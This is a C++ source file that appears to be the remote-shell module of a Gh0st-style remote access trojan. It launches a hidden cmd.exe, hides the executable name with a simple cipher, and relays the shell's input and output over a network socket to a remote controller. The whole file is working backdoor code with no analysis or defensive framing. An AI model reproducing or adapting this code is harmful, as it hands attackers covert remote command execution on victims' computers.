#include "StdAfx.h"
#include "ShellManager.h"
#include "ClientSocket.h"

CShellManager::CShellManager(CClientSocket *pClient):CManager(pClient)
{
    m_hReadPipeHandle	= NULL;
    m_hWritePipeHandle	= NULL;
	m_hReadPipeShell	= NULL;
    m_hWritePipeShell	= NULL;

	m_hProcessHandle = NULL;
	m_hThreadHandle = NULL;
	m_hThreadRead = NULL;
	m_hThreadMonitor = NULL;

	SECURITY_ATTRIBUTES sa = {0};
    sa.nLength = sizeof(sa);
    sa.lpSecurityDescriptor = NULL; 
    sa.bInheritHandle = TRUE;
	BOOL bRet = ::CreatePipe(&m_hReadPipeHandle, &m_hWritePipeShell, &sa, 0);
    if (!bRet)
	{
		if (m_hReadPipeHandle != NULL)
		{
			::CloseHandle(m_hReadPipeHandle);
		}

		if (m_hWritePipeShell != NULL)
		{
			::CloseHandle(m_hWritePipeShell);
		}

		return;
    }

	bRet = ::CreatePipe(&m_hReadPipeShell, &m_hWritePipeHandle, &sa, 0);
    if (!bRet) 
	{
		if (m_hWritePipeHandle != NULL)
		{
			::CloseHandle(m_hWritePipeHandle);
		}

		if (m_hReadPipeShell != NULL)
		{
			::CloseHandle(m_hReadPipeShell);
		}

		return;
    }

	STARTUPINFO si = {0};
	::GetStartupInfo(&si);
	si.cb = sizeof(STARTUPINFO);
    si.wShowWindow = SW_HIDE;
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.hStdInput  = m_hReadPipeShell;
    si.hStdOutput = si.hStdError = m_hWritePipeShell; 

	char strShellPath[MAX_PATH] = {0};
	::GetSystemDirectory(strShellPath, MAX_PATH);

	//开启CMD进程,这里是加密的/cmd.exe
	char str1[50] = "@[QX.YdY";
	EncryptData((unsigned char *)&str1, ::lstrlen(str1), ENCODEKEY+2);
	::lstrcat(strShellPath, str1);

	PROCESS_INFORMATION pi = {0};
	bRet = ::CreateProcess(strShellPath, 
		NULL, 
		NULL,
		NULL, 
		TRUE, 
		NORMAL_PRIORITY_CLASS, 
		NULL, 
		NULL, 
		&si, 
		&pi);
	if (!bRet)
	{
		::CloseHandle(m_hReadPipeHandle);		
		::CloseHandle(m_hWritePipeHandle);		
		::CloseHandle(m_hReadPipeShell);		
		::CloseHandle(m_hWritePipeShell);
		
		return;
    }

	m_hProcessHandle = pi.hProcess;
	m_hThreadHandle	= pi.hThread;

	BYTE bToken = TOKEN_SHELL_START;
	Send((LPBYTE)&bToken, 1);
	WaitForDialogOpen();

	m_hThreadRead = MyCreateThread(NULL, 0, ReadPipeThread, this, 0, NULL);
	m_hThreadMonitor = MyCreateThread(NULL, 0, MonitorThread, this, 0, NULL);
}

CShellManager::~CShellManager()
{
	::TerminateThread(m_hThreadRead, 0);
	::CloseHandle(m_hThreadRead);

	::TerminateProcess(m_hProcessHandle, 0);
	::CloseHandle(m_hProcessHandle);
	
	::TerminateThread(m_hThreadHandle, 0);
	::CloseHandle(m_hThreadHandle);
	
	::WaitForSingleObject(m_hThreadMonitor, 2000);
	::TerminateThread(m_hThreadMonitor, 0);
	::CloseHandle(m_hThreadMonitor);
	
	if (m_hReadPipeHandle != NULL)
	{
		::DisconnectNamedPipe(m_hReadPipeHandle);
		::CloseHandle(m_hReadPipeHandle);
	}

	if (m_hWritePipeHandle != NULL)
	{
		::DisconnectNamedPipe(m_hWritePipeHandle);
		::CloseHandle(m_hWritePipeHandle);
	}

	if (m_hReadPipeShell != NULL)
	{
		::DisconnectNamedPipe(m_hReadPipeShell);
		::CloseHandle(m_hReadPipeShell);
	}

	if (m_hWritePipeShell != NULL)
	{
		::DisconnectNamedPipe(m_hWritePipeShell);
		::CloseHandle(m_hWritePipeShell);
	}
}

void CShellManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
{
	if (nSize == 1 && lpBuffer[0] == COMMAND_NEXT)
	{
		NotifyDialogIsOpen();
		return;
	}
	
	DWORD ByteWrite = 0;
	::WriteFile(m_hWritePipeHandle, lpBuffer, nSize, &ByteWrite, NULL);
}

DWORD WINAPI CShellManager::ReadPipeThread(LPVOID lparam)
{
	CShellManager *pThis = (CShellManager *)lparam;
	while (TRUE)
	{
		::Sleep(100);

		DWORD TotalBytesAvail = 0;
		ULONG BytesRead = 0;
		char ReadBuff[1024] = {0};
		while (PeekNamedPipe(pThis->m_hReadPipeHandle, ReadBuff, sizeof(ReadBuff), &BytesRead, &TotalBytesAvail, NULL)) 
		{
			if (BytesRead <= 0)
			{
				break;
			}

			LPBYTE lpBuffer = (LPBYTE)::LocalAlloc(LPTR, TotalBytesAvail + 1);
			::ReadFile(pThis->m_hReadPipeHandle, lpBuffer, TotalBytesAvail, &BytesRead, NULL);
			lpBuffer[TotalBytesAvail] = '\0';
			//发送数据
			pThis->Send(lpBuffer, BytesRead + 1);
			::LocalFree(lpBuffer);
		}
	}

	return 0;
}

DWORD WINAPI CShellManager::MonitorThread(LPVOID lparam)
{
	CShellManager *pThis = (CShellManager *)lparam;

	HANDLE hThread[2] = {0};
	hThread[0] = pThis->m_hProcessHandle;
	hThread[1] = pThis->m_hThreadRead;
	::WaitForMultipleObjects(2, hThread, FALSE, INFINITE);

	::TerminateThread(pThis->m_hThreadRead, 0);
	pThis->m_hThreadRead = NULL;

	::TerminateProcess(pThis->m_hProcessHandle, 1);
	pThis->m_hProcessHandle = NULL;

	pThis->m_pClient->Disconnect();

	return 0;
}